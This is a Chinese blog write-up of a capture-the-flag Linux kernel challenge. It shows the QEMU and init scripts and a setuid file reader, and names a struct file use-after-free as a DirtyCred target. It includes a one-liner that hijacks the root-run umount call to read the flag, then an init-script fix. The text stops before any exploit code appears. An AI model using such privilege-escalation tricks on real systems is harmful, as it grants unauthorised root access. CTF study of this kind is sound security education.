@@ -1,0 +1,1077 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Dirty_cred_kernel_pwn - cnitlrtの博客</title><meta name="Description" content="某未知比赛的题目"><meta property="og:title" content="Dirty_cred_kernel_pwn" />
+<meta property="og:description" content="某未知比赛的题目" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://cnitlrt.github.io/dirty_cred_kernel_pwn/" /><meta property="og:image" content="https://cnitlrt.github.io/logo.jpg"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-11-26T00:46:08+08:00" />
+<meta property="article:modified_time" content="2023-11-26T01:18:38+08:00" /><meta property="og:site_name" content="My cool site" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://cnitlrt.github.io/logo.jpg"/>
+
+<meta name="twitter:title" content="Dirty_cred_kernel_pwn"/>
+<meta name="twitter:description" content="某未知比赛的题目"/>
+<meta name="application-name" content="LoveIt">
+<meta name="apple-mobile-web-app-title" content="LoveIt"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://cnitlrt.github.io/dirty_cred_kernel_pwn/" /><link rel="prev" href="https://cnitlrt.github.io/netlink/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Dirty_cred_kernel_pwn",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/cnitlrt.github.io\/dirty_cred_kernel_pwn\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "https:\/\/cnitlrt.github.io\/images\/Apple-Devices-Preview.png",
+                            "width":  3200 ,
+                            "height":  2048 
+                        }],"genre": "posts","keywords": "kernel","wordcount":  2580 ,
+        "url": "https:\/\/cnitlrt.github.io\/dirty_cred_kernel_pwn\/","datePublished": "2023-11-26T00:46:08+08:00","dateModified": "2023-11-26T01:18:38+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/cnitlrt.github.io\/images\/avatar.jpg",
+                    "width":  1080 ,
+                    "height":  1080 
+                }},"author": {
+                "@type": "Person",
+                "name": "cnitlrt"
+            },"description": "某未知比赛的题目"
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="cnitlrtの博客"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw'></i></span><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/cnitlrt" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i> Github </a><a class="menu-item" href="/friend/"> 友链 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="cnitlrtの博客"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw'></i></span><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/cnitlrt" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>Github</a><a class="menu-item" href="/friend/" title="">友链</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Dirty_cred_kernel_pwn</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>cnitlrt</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Categories</a>&nbsp;<a href="/categories/kernel-pwn/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>kernel pwn</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-11-26">2023-11-26</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 2580 字&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 6 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#startsh">start.sh</a></li>
+        <li><a href="#init">init</a></li>
+        <li><a href="#read_filec">read_file.c</a></li>
+        <li><a href="#ko">ko</a></li>
+        <li><a href="#非预期">非预期</a>
+          <ul>
+            <li><a href="#init文件修复">init文件修复</a></li>
+          </ul>
+        </li>
+        <li><a href="#正常做">正常做</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="startsh">start.sh</h2>
+<p>两核四进程</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/sh
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>qemu-system-x86_64 <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -m 256M <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -kernel bzImage <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -initrd rootfs.cpio <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -append <span class="s1">&#39;root=/dev/ram console=ttyS0 oops=panic panic=1 nokaslr&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -monitor /dev/null <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -cpu kvm64,+smep <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -monitor /dev/null <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -smp <span class="nv">cores</span><span class="o">=</span>2,threads<span class="o">=</span><span class="m">4</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -netdev user,id<span class="o">=</span>t0, -device e1000,netdev<span class="o">=</span>t0,id<span class="o">=</span>nic0 <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -nographic <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -enable-kvm <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    --no-reboot <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -s
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="init">init</h2>
+<p>insmod了/usr/fileManager.ko
+有一个read_file文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/sh
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="nb">echo</span> <span class="s2">&#34;INIT SCRIPT&#34;</span>
+</span></span><span class="line"><span class="cl">mkdir /tmp
+</span></span><span class="line"><span class="cl">mount -t proc none /proc
+</span></span><span class="line"><span class="cl">mount -t sysfs none /sys
+</span></span><span class="line"><span class="cl">mount -t devtmpfs none /dev
+</span></span><span class="line"><span class="cl">mount -t debugfs none /sys/kernel/debug
+</span></span><span class="line"><span class="cl">mount -t tmpfs none /tmp
+</span></span><span class="line"><span class="cl">insmod /usr/fileManager.ko
+</span></span><span class="line"><span class="cl">chmod <span class="m">666</span> /dev/fileManager
+</span></span><span class="line"><span class="cl">chmod <span class="m">600</span> /flag
+</span></span><span class="line"><span class="cl">chmod <span class="m">755</span> /read_file
+</span></span><span class="line"><span class="cl">chmod u+s /read_file
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="m">2000</span> &gt; /proc/sys/fs/nr_open
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> -n <span class="s2">&#34;/read_file.c&#34;</span> &gt; /happy
+</span></span><span class="line"><span class="cl">chmod <span class="m">644</span> /happy
+</span></span><span class="line"><span class="cl">chmod <span class="m">644</span> /read_file.c
+</span></span><span class="line"><span class="cl">poweroff -d <span class="m">600</span> -f <span class="p">&amp;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> -e <span class="s2">&#34;Boot took </span><span class="k">$(</span>cut -d<span class="s1">&#39; &#39;</span> -f1 /proc/uptime<span class="k">)</span><span class="s2"> seconds&#34;</span>
+</span></span><span class="line"><span class="cl">setsid /bin/cttyhack setuidgid <span class="m">1000</span> /bin/sh
+</span></span><span class="line"><span class="cl">umount /proc
+</span></span><span class="line"><span class="cl">umount /sys
+</span></span><span class="line"><span class="cl">poweroff -d <span class="m">0</span>  -f
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="read_filec">read_file.c</h2>
+<p>读取/happy文件内容，并将其作为参数，读取参数内容，若是能控制/happy文件的内容的话，就可以做到任意文件读</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define _GNU_SOURCE
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="k">const</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">setresuid</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">setresgid</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/happy&#34;</span><span class="p">,</span><span class="n">O_RDONLY</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">1024</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">fd2</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="n">O_RDONLY</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">read</span><span class="p">(</span><span class="n">fd2</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">puts</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">close</span><span class="p">(</span><span class="n">fd2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="ko">ko</h2>
+<p>有着一个很明显的struct file uaf，因此第一时间想到了<a href="https://bsauce.github.io/2022/10/12/DirtyCred/" target="_blank" rel="noopener noreffer ">dirty_cred</a> 方法</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com/image/20231126005130.png"
+        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com/image/20231126005130.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com/image/20231126005130.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com/image/20231126005130.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com/image/20231126005130.png"
+        title="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com/image/20231126005130.png" /></p>
+<h2 id="非预期">非预期</h2>
+<p>由于没有很好的控制权限，因此可以非预期</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mv /bin /BIN <span class="o">&amp;&amp;</span> /BIN/mkdir /bin <span class="o">&amp;&amp;</span> /BIN/chmod <span class="m">777</span> /bin <span class="o">&amp;&amp;</span> /BIN/echo <span class="s2">&#34;/BIN/cat /flag&#34;</span> &gt; /bin/umount <span class="o">&amp;&amp;</span> /BIN/chmod <span class="m">777</span> /bin/umount
+</span></span><span class="line"><span class="cl"><span class="nb">exit</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="init文件修复">init文件修复</h3>
+<p>添加</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">chown root:root /*
+</span></span><span class="line"><span class="cl">chown root:root .
+</span></span><span class="line"><span class="cl">chmod <span class="m">755</span> .
+</span></span><span class="line"><span class="cl">chmod <span class="m">755</span> /*
+</span></span><span class="line"><span class="cl">chmod <span class="m">777</span> /tmp
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/sh
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="nb">echo</span> <span class="s2">&#34;INIT SCRIPT&#34;</span>
+</span></span><span class="line"><span class="cl">mkdir /tmp
+</span></span><span class="line"><span class="cl">mount -t proc none /proc
+</span></span><span class="line"><span class="cl">mount -t sysfs none /sys
+</span></span><span class="line"><span class="cl">mount -t devtmpfs none /dev
+</span></span><span class="line"><span class="cl">mount -t debugfs none /sys/kernel/debug
+</span></span><span class="line"><span class="cl">mount -t tmpfs none /tmp
+</span></span><span class="line"><span class="cl">insmod /usr/fileManager.ko
+</span></span><span class="line"><span class="cl">chown root:root /*
+</span></span><span class="line"><span class="cl">chown root:root .
+</span></span><span class="line"><span class="cl">chmod <span class="m">755</span> .
+</span></span><span class="line"><span class="cl">chmod <span class="m">755</span> /*
+</span></span><span class="line"><span class="cl">chmod <span class="m">666</span> /dev/fileManager
+</span></span><span class="line"><span class="cl">chmod <span class="m">600</span> /flag
+</span></span><span class="line"><span class="cl">chmod <span class="m">755</span> /read_file
+</span></span><span class="line"><span class="cl">chmod <span class="m">777</span> /tmp
+</span></span><span class="line"><span class="cl">chmod u+s /read_file
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="m">2000</span> &gt; /proc/sys/fs/nr_open
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> -n <span class="s2">&#34;/read_file.c&#34;</span> &gt; /happy
+</span></span><span class="line"><span class="cl">chmod <span class="m">644</span> /happy
+</span></span><span class="line"><span class="cl">chmod <span class="m">644</span> /read_file.c
+</span></span><span class="line"><span class="cl">poweroff -d <span class="m">600</span> -f <span class="p">&amp;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> -e <span class="s2">&#34;Boot took </span><span class="k">$(</span>cut -d<span class="s1">&#39; &#39;</span> -f1 /proc/uptime<span class="k">)</span><span class="s2"> seconds&#34;</span>
+</span></span><span class="line"><span class="cl">setsid /bin/cttyhack setuidgid <span class="m">1000</span> /bin/sh
+</span></span><span class="line"><span class="cl">umount /proc
+</span></span><span class="line"><span class="cl">umount /sys
+</span></span><span class="line"><span class="cl">poweroff -d <span class="m">0</span>  -f
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="正常做">正常做</h2>
+<p>直接修改dirty_cred脚本即可，细节待补充
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20231126011723-481.png"
+        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20231126011723-481.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20231126011723-481.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20231126011723-481.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20231126011723-481.png"
+        title="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20231126011723-481.png" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
